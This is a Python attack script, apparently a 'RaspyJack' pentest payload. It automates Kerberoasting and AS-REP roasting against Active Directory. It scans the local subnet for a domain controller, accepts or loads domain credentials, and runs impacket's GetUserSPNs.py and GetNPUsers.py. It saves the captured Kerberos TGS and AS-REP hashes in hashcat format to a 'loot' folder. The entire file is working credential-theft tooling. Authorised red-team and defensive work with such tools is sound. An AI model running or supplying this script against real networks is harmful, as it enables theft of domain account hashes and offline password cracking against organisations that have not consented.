#!/usr/bin/env python3
# @name: Kerberoast & AS-REP Roast
# @desc: Kerberoasting / AS-REP Roasting via impacket (GetUserSPNs.py, GetNPUsers.py).
# @category: credentials
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- Kerberoast & AS-REP Roast
Kerberoasting / AS-REP Roasting via impacket (GetUserSPNs.py, GetNPUsers.py).
Auto-detects DC, collects TGS/AS-REP hashes in hashcat format.

Controls:
  python3 kerberoast.py [kerberoast|asrep]

  mode  -- optional. "kerberoast" for TGS roasting or "asrep" for
           AS-REP roasting. If omitted, you'll be prompted to choose
           from a numbered list.

  Auto-detects the Domain Controller on the local subnet, then prompts
  for domain/username/password (or loads them from
  $CITYPOP_ROOT/config/kerberoast/creds.json if present) before
  running the attack. Hashes are printed as they're captured and a
  summary is exported to loot when the run finishes.

Loot: $CITYPOP_ROOT/loot/Kerberoast/
"""
from payloads._web_input import request_input
import os, sys, json, time, socket, shutil, threading, subprocess, getpass
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

LOOT_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'Kerberoast')
CREDS_PATH = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'config', 'kerberoast', 'creds.json')
MODES = ["Kerberoast", "AS-REP Roast"]
DC_PORTS = [88, 389]
SCAN_TIMEOUT = 1.5

os.makedirs(LOOT_DIR, exist_ok=True)

lock = threading.Lock()
mode_idx = 0            # 0 = Kerberoast, 1 = AS-REP
dc_ip = ""
domain = ""
username = ""
password = ""
hashes_found = []       # list of dicts: {account, hash, spn}
attack_running = False
dc_detected = False
spn_count = 0


def _find_tool(name):
    """Locate an impacket tool by name. Returns path or None."""
    path = shutil.which(name)
    if path:
        return path
    candidates = [
        f"/usr/bin/{name}",
        f"/usr/local/bin/{name}",
        f"/usr/share/doc/python3-impacket/examples/{name}",
        os.path.expanduser(f"~/.local/bin/{name}"),
    ]
    for c in candidates:
        if os.path.isfile(c):
            return c
    return None


def _impacket_available():
    """Check if core impacket tools exist."""
    return _find_tool("GetUserSPNs.py") is not None


def _load_creds_from_config():
    """Load credentials from JSON config file. Returns (domain, user, pw)."""
    if not os.path.isfile(CREDS_PATH):
        return None, None, None
    try:
        with open(CREDS_PATH, "r") as f:
            data = json.load(f)
        return (
            data.get("domain", ""),
            data.get("username", ""),
            data.get("password", ""),
        )
    except (json.JSONDecodeError, OSError):
        return None, None, None


def _check_port(ip, port, timeout=SCAN_TIMEOUT):
    """Return True if TCP port is open."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((ip, port)) == 0
    except OSError:
        return False


def _get_gateway_subnet():
    """Return the gateway IP and /24 subnet prefix."""
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if "via" in parts:
                gw = parts[parts.index("via") + 1]
                prefix = ".".join(gw.split(".")[:3])
                return gw, prefix
    except (subprocess.SubprocessError, IndexError, ValueError):
        pass
    return None, None


def _scan_for_dc():
    """Scan local subnet for a Domain Controller (port 88 + 389)."""
    global dc_ip, dc_detected

    print("[*] Scanning for Domain Controller...", flush=True)

    gw, prefix = _get_gateway_subnet()
    if not prefix:
        print("[!] No network found.", flush=True)
        return

    # Check gateway first (often the DC in lab environments)
    if gw and all(_check_port(gw, p) for p in DC_PORTS):
        with lock:
            dc_ip = gw
            dc_detected = True
        print(f"[+] DC found at gateway: {gw}", flush=True)
        return

    # Scan /24 range
    print(f"[*] Scanning {prefix}.0/24 for a DC (ports 88+389)...", flush=True)
    for i in range(1, 255):
        ip = f"{prefix}.{i}"
        if ip == gw:
            continue

        if dc_detected:
            return
        if i % 50 == 0:
            print(f"[*] Scan progress: {ip}", flush=True)

        if _check_port(ip, 88, timeout=0.5):
            if _check_port(ip, 389, timeout=0.5):
                with lock:
                    dc_ip = ip
                    dc_detected = True
                print(f"[+] DC found: {ip}", flush=True)
                return

    print("[!] No DC found on the local subnet.", flush=True)


def _run_kerberoast_impacket():
    """Run GetUserSPNs.py to extract TGS hashes."""
    global hashes_found, spn_count, attack_running

    tool = _find_tool("GetUserSPNs.py")
    if not tool:
        print("[!] GetUserSPNs.py not found.", flush=True)
        with lock:
            attack_running = False
        return

    with lock:
        target_dc = dc_ip
        dom = domain
        user = username
        pw = password

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    outfile = os.path.join(LOOT_DIR, f"hashes_{ts}.txt")

    print("[*] Running GetUserSPNs...", flush=True)

    try:
        result = subprocess.run(
            [
                "python3", tool,
                f"{dom}/{user}:{pw}",
                "-dc-ip", target_dc,
                "-request",
                "-outputfile", outfile,
            ],
            capture_output=True, text=True, timeout=120,
        )
    except subprocess.TimeoutExpired:
        print("[!] Timed out after 120s.", flush=True)
        with lock:
            attack_running = False
        return
    except OSError as exc:
        print(f"[!] Error: {exc}", flush=True)
        with lock:
            attack_running = False
        return

    _parse_impacket_output(result.stdout, result.stderr, outfile)

    with lock:
        attack_running = False


def _parse_impacket_output(stdout, stderr, outfile):
    """Parse GetUserSPNs output and hash file."""
    global hashes_found, spn_count

    parsed = []

    # Count SPNs from stdout
    count = 0
    for line in stdout.splitlines():
        stripped = line.strip()
        if stripped and not stripped.startswith("Impacket") and "/" in stripped:
            count += 1

    # Parse output hash file
    if os.path.isfile(outfile):
        try:
            with open(outfile, "r") as f:
                for line in f:
                    line = line.strip()
                    if line.startswith("$krb5tgs$"):
                        parts = line.split("$")
                        account = parts[3] if len(parts) > 3 else "unknown"
                        spn_name = parts[4] if len(parts) > 4 else ""
                        parsed.append({
                            "account": account,
                            "hash": line,
                            "spn": spn_name[:40],
                        })
        except OSError:
            pass

    with lock:
        hashes_found = parsed
        spn_count = max(count, len(parsed))

    if parsed:
        print(f"[+] Captured {len(parsed)} TGS hash(es).", flush=True)
        for h in parsed:
            print(f"    {h['account']}  spn={h['spn']}", flush=True)
    elif "error" in stderr.lower():
        err_line = stderr.strip().splitlines()[-1] if stderr.strip() else "Error"
        print(f"[!] {err_line}", flush=True)
    else:
        print("[*] No SPN accounts found.", flush=True)


def _run_asrep_impacket():
    """Run GetNPUsers.py to find accounts without pre-auth."""
    global hashes_found, spn_count, attack_running

    tool = _find_tool("GetNPUsers.py")
    if not tool:
        print("[!] GetNPUsers.py not found.", flush=True)
        with lock:
            attack_running = False
        return

    with lock:
        target_dc = dc_ip
        dom = domain
        user = username
        pw = password

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    outfile = os.path.join(LOOT_DIR, f"hashes_{ts}.txt")

    print("[*] Running GetNPUsers...", flush=True)

    try:
        result = subprocess.run(
            [
                "python3", tool,
                f"{dom}/{user}:{pw}",
                "-dc-ip", target_dc,
                "-request",
                "-format", "hashcat",
                "-outputfile", outfile,
            ],
            capture_output=True, text=True, timeout=120,
        )
    except subprocess.TimeoutExpired:
        print("[!] Timed out after 120s.", flush=True)
        with lock:
            attack_running = False
        return
    except OSError as exc:
        print(f"[!] Error: {exc}", flush=True)
        with lock:
            attack_running = False
        return

    _parse_asrep_output(result.stdout, result.stderr, outfile)

    with lock:
        attack_running = False


def _parse_asrep_output(stdout, stderr, outfile):
    """Parse GetNPUsers output and hash file."""
    global hashes_found, spn_count

    parsed = []

    if os.path.isfile(outfile):
        try:
            with open(outfile, "r") as f:
                for line in f:
                    line = line.strip()
                    if line.startswith("$krb5asrep$"):
                        parts = line.split("$")
                        account = parts[3] if len(parts) > 3 else "unknown"
                        # Strip @domain from account
                        if "@" in account:
                            account = account.split("@")[0]
                        parsed.append({
                            "account": account,
                            "hash": line,
                            "spn": "NO_PREAUTH",
                        })
        except OSError:
            pass

    with lock:
        hashes_found = parsed
        spn_count = len(parsed)

    if parsed:
        print(f"[+] Captured {len(parsed)} AS-REP hash(es).", flush=True)
        for h in parsed:
            print(f"    {h['account']}", flush=True)
    elif "error" in stderr.lower():
        err_line = stderr.strip().splitlines()[-1] if stderr.strip() else "Error"
        print(f"[!] {err_line}", flush=True)
    else:
        print("[*] No vulnerable (pre-auth disabled) accounts found.", flush=True)


def _save_summary():
    """Save a JSON summary of the attack results."""
    with lock:
        data = {
            "timestamp": datetime.now().isoformat(),
            "mode": MODES[mode_idx],
            "dc_ip": dc_ip,
            "domain": domain,
            "username": username,
            "spn_count": spn_count,
            "hashes_captured": len(hashes_found),
            "accounts": [
                {"account": h["account"], "spn": h["spn"]}
                for h in hashes_found
            ],
        }

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"roast_{ts}.json")
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
        print(f"[*] Summary saved to {path}", flush=True)
    except OSError:
        pass
    return path


def _run_attack():
    """Run the selected attack mode."""
    global attack_running

    with lock:
        if attack_running:
            return
        attack_running = True

    with lock:
        current_mode = mode_idx

    if current_mode == 0:
        _run_kerberoast_impacket()
    else:
        _run_asrep_impacket()

    # Save summary after attack completes
    with lock:
        has_hashes = len(hashes_found) > 0

    if has_hashes:
        _save_summary()


def _prompt_credentials():
    """Ask the operator for domain/username/password, or load from config."""
    global domain, username, password

    # Try config file first
    cfg_dom, cfg_user, cfg_pw = _load_creds_from_config()
    if cfg_dom and cfg_user and cfg_pw:
        with lock:
            domain = cfg_dom
            username = cfg_user
            password = cfg_pw
        print(f"[*] Credentials loaded from {CREDS_PATH}", flush=True)
        return True

    # Manual CLI input
    try:
        dom = request_input("Domain (e.g. corp.local): ").strip()
        if not dom:
            return False
        user = request_input("Username: ").strip()
        if not user:
            return False
        pw = getpass.getpass("Password: ")
        if not pw:
            return False
    except (EOFError, KeyboardInterrupt):
        print("\n[!] Credential entry cancelled.", flush=True)
        return False

    with lock:
        domain = dom
        username = user
        password = pw
    print("[*] Credentials set.", flush=True)
    return True


def main():
    global mode_idx

    if "-h" in sys.argv or "--help" in sys.argv:
        print("Usage: python3 kerberoast.py [kerberoast|asrep]", flush=True)
        return 0

    print("[*] Kerberoast & AS-REP Roast -- TGS & AS-REP hash extraction", flush=True)

    mode_arg = sys.argv[1].lower() if len(sys.argv) > 1 else None
    if mode_arg in ("kerberoast", "kerb"):
        mode_idx = 0
    elif mode_arg in ("asrep", "as-rep"):
        mode_idx = 1
    elif mode_arg:
        print(f"[!] Unknown mode '{mode_arg}'. Use 'kerberoast' or 'asrep'.", flush=True)
        return 1
    else:
        print("Select attack mode:", flush=True)
        for i, m in enumerate(MODES, 1):
            print(f"  {i}. {m}", flush=True)
        choice = request_input(f"Mode [1-{len(MODES)}]: ").strip()
        try:
            idx = int(choice) - 1
            if idx < 0 or idx >= len(MODES):
                raise ValueError
        except ValueError:
            print("[!] Invalid selection.", flush=True)
            return 1
        mode_idx = idx

    print(f"[*] Mode: {MODES[mode_idx]}", flush=True)

    try:
        _scan_for_dc()
        if not dc_detected:
            return 1

        if not (domain and username and password):
            if not _prompt_credentials():
                print("[!] Credentials required. Aborting.", flush=True)
                return 1

        if not _impacket_available():
            print("[!] Impacket tools not found (GetUserSPNs.py). Install "
                  "impacket and try again.", flush=True)
            return 1

        _run_attack()

    except KeyboardInterrupt:
        print("\n[*] Interrupted.", flush=True)
        return 1

    with lock:
        h_count = len(hashes_found)
    print(f"[*] Done. {h_count} hash(es) captured.", flush=True)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
